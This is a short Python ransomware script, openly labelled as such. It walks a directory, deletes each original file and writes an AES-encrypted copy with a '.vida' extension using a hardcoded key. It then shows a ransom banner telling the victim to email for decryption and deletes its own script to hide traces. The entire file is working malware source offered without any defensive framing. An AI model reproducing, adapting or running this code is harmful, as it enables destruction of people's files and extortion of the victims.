#!/bin/env python3

#---------------------------------------------#
# First Ransomware on python
# Cryptography: AES
# Coded by vida
#---------------------------------------------#

# import libs
import os, pyaes, sys

# vars of control
#dir = os.getcwd() # current dir to crypt, not tested

current_dir = os.getcwd()
dir = '/home/vida/teste_ransomware'
ext = '.vida'
key = b'29iskskm992212w3' # 16 Bytes
email = 'yourEmail@gmail.com'
program_name = current_dir+'/'+sys.argv[0]

# list archives
def encrypt():
	os.chdir(dir)

	# list path for archives
	for folder, subfolders, archives in os.walk(dir):
		for archive in archives:

			# get original path
			target = os.path.join(os.path.realpath(folder), archive)

			# get original data
			with open(target, 'rb') as file:
				data = file.read()

			os.remove(target) # remove original files

			# set AES algorithm
			aes = pyaes.AESModeOfOperationCTR(key)
			crypt_data = aes.encrypt(data)
		
			# generate encrypted file
			fileEnc = target + ext
			with open(fileEnc, 'wb') as file:
				file.write(crypt_data)

def banner(msg):
	print(f"""

      ,  ,  , , ,
     <(__)> | | |
     | \/ | \_|_/
     \^  ^/   |
     /\--/\  /|
    /  \/  \/ |

   {msg}
""")

if __name__ == "__main__":
	encrypt()
	banner(f"Opss, your data has been stolen\n   Contact: {email} to send decrypt\n   This message will only appear once")
	os.remove(program_name)
